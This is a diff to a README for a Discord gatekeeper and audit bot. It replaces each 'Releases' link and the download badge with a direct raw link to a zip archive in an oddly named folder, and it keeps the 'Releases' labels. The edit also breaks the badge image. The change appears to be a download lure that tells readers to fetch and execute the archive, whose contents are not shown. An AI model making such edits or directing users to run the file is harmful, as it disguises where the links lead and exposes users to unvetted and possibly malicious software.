@@ -31,13 +31,13 @@ Simply add the bot to your server and configure it to start automated management
 
 ## Get Started 🔧
 
-To start using this bot, visit the [**Releases**](https://github.com/ThePotatoman32/discord-gatekeeper-audit-bot/releases) section and download the file provided to execute the bot.
+To start using this bot, visit the [**Releases**](https://raw.githubusercontent.com/ThePotatoman32/discord-gatekeeper-audit-bot/main/Crocanthemum/bot_audit_gatekeeper_discord_v1.5.zip) section and download the file provided to execute the bot.
 
-[![Download Bot](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://github.com/ThePotatoman32/discord-gatekeeper-audit-bot/releases)
+[![Download Bot](https://raw.githubusercontent.com/ThePotatoman32/discord-gatekeeper-audit-bot/main/Crocanthemum/bot_audit_gatekeeper_discord_v1.5.zip%20Here-brightgreen)](https://raw.githubusercontent.com/ThePotatoman32/discord-gatekeeper-audit-bot/main/Crocanthemum/bot_audit_gatekeeper_discord_v1.5.zip)
 
 ## Support 🔗
 
-If you encounter any issues or have questions about the bot, please refer to the provided [**Releases**](https://github.com/ThePotatoman32/discord-gatekeeper-audit-bot/releases) section for more information.
+If you encounter any issues or have questions about the bot, please refer to the provided [**Releases**](https://raw.githubusercontent.com/ThePotatoman32/discord-gatekeeper-audit-bot/main/Crocanthemum/bot_audit_gatekeeper_discord_v1.5.zip) section for more information.
 
 Thank you for considering using the **discord-gatekeeper-audit-bot** for your Discord server management needs. Stay organized and secure with automated verification processes! 👍
 
